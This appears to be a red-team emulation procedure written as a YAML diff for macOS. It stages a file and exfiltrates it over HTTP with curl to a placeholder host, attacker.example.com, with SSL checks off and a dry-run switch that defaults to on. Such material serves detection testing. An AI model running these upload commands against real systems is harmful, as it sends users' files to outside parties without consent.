@@ -1,0 +1,115 @@
+id: 006-upload-curl-http
+name: Upload via cURL to HTTP Server
+description: Exfiltrates data by uploading files to an HTTP server using cURL
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: f6a7b8c9-d0e1-4f2a-3b4c-5d6e7f8091a2
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: Path to file for upload
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  remote_url:
+    description: Remote HTTP server URL
+    type: string
+    default: "http://attacker.example.com/upload"
+  timeout:
+    description: cURL timeout in seconds
+    type: string
+    default: "30"
+  verify_ssl:
+    description: Verify SSL certificates
+    type: string
+    default: "false"
+  dry_run:
+    description: Enable dry-run mode (no actual upload)
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Get file information
+    type: command
+    executor: bash
+    command: |
+      ls -lh '{{ args.file_path }}'
+      file '{{ args.file_path }}'
+      echo "MD5: $(md5 '{{ args.file_path }}' | awk '{print $NF}')"
+    cleanup: false
+  
+  - name: Prepare upload
+    type: command
+    executor: bash
+    command: |
+      filename=$(basename '{{ args.file_path }}')
+      echo "Preparing to upload: $filename"
+      echo "Target URL: {{ args.remote_url }}"
+      echo "File size: $(du -h '{{ args.file_path }}' | cut -f1)"
+    cleanup: false
+  
+  - name: Execute upload
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: Would upload with the following command:"
+        if [ '{{ args.verify_ssl }}' = 'false' ]; then
+          echo "curl -k --max-time {{ args.timeout }} --upload-file '{{ args.file_path }}' '{{ args.remote_url }}/$(basename '{{ args.file_path }}')')"
+        else
+          echo "curl --max-time {{ args.timeout }} --upload-file '{{ args.file_path }}' '{{ args.remote_url }}/$(basename '{{ args.file_path }}')')"
+        fi
+      else
+        if [ '{{ args.verify_ssl }}' = 'false' ]; then
+          curl -k --max-time {{ args.timeout }} --upload-file '{{ args.file_path }}' '{{ args.remote_url }}/$(basename '{{ args.file_path }}')'
+        else
+          curl --max-time {{ args.timeout }} --upload-file '{{ args.file_path }}' '{{ args.remote_url }}/$(basename '{{ args.file_path }}')'
+        fi
+      fi
+    cleanup: false
+checks:
+  - name: Upload URL is valid
+    description: Verify remote URL is properly formatted
+    type: command
+    command: echo '{{ args.remote_url }}' | grep -qE '^https?://' && echo "Valid HTTP URL"
+  
+  - name: File is uploadable
+    description: Verify file is readable and accessible
+    type: command
+    command: test -r '{{ args.file_path }}' && echo "File is readable"
+tests:
+  dry_run:
+    - name: Test HTTP upload (dry-run)
+      description: Test upload without actual HTTP request
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "Exfiltrated data" > /tmp/test_upload.dat
+        
+        - name: Simulate upload
+          type: command
+          executor: bash
+          command: |
+            echo "Simulating upload of /tmp/test_upload.dat to http://localhost/upload"
+            echo "File size: $(du -h /tmp/test_upload.dat | cut -f1)"
+        
+        - name: Show upload command
+          type: command
+          executor: bash
+          command: echo "curl --upload-file /tmp/test_upload.dat http://localhost/upload"
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_upload.dat
+    ignore_errors: true
